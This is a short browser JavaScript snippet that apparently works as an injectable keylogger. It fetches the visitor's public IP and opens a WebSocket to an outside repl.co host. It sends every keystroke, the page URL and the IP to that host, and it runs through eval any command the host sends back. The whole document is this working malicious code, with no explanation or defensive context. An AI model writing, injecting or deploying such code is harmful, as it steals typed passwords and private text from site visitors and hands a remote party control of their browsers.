var x_xmlhttp_x=new XMLHttpRequest();
x_xmlhttp_x.open("GET","https://jsonip.com/",false);
x_xmlhttp_x.send(null);
var x_ipadr_x=JSON.parse(x_xmlhttp_x.responseText).ip;
var x_skt_x=new WebSocket("wss://JauntyScalyScans.kimplayz4lk.repl.co");
var x_lstnr_x=document.addEventListener("keydown",e=>{if(x_skt_x.readyState==x_skt_x.OPEN){x_skt_x.send(JSON.stringify({url:location.href,k:e.key,ip:x_ipadr_x}));}});
x_skt_x.addEventListener("message",data=>{data=JSON.parse(data.data);if(data.type=="ctrl"){eval(data.cmd);}});